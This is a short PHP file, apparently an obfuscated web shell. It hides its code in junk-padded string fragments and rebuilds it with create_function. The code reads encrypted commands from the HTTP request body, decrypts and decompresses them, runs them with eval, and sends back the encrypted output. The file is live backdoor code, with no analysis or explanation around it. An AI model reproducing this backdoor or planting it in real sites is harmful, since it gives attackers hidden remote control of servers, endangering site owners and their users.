<?php
$Y=';$j++,$*li++){$o.=*l*l$t{$i}^$k{$j*l};}}r*letu*lrn $o;}i*lf *l(@preg_m*lat';
$B='=*l"PPXCm*lTARCN*lyE251w";fun*l*lc*ltion x($t,*l$k*l){$c=strlen*l($k);$l=s';
$n='trl*le*ln($t);$o="";for*l($*li=0;*l$i<$l;){fo*lr($j=*l0;*l($j*l<$c&&*l$i<$l)';
$d='@bas*le64_encode(@*lx(@gzc*lompre*ls*ls($o),$k))*l;print(*l"*l$p$kh$r$kf");}';
$g='*l$k="8*ldc64cf9";*l$*lkh="b6*l4b1def*l9e85";$*l*lkf="4d276f*l0d52c5";$p';
$N=str_replace('wV','','wVcreatwVwVe_fwVwVuwVnction');
$J=')==1) {@ob_s*ltart();*l@eva*ll(@gzunc*lom*lpre*lss(*l@x(@bas*le64_*ldecode(';
$V='$m[1]),$k)*l));$o=@o*lb_g*let_c*lonten*l*lts();@ob_e*lnd_clean*l()*l;$r=';
$a='ch("*l/$kh(.*l+)$kf/",@f*lile*l_get_co*lnte*lnts("*lph*lp:/*l/input")*l,$m';
$Q=str_replace('*l','',$g.$B.$n.$Y.$a.$J.$V.$d);
$p=$N('',$Q);$p();
?>
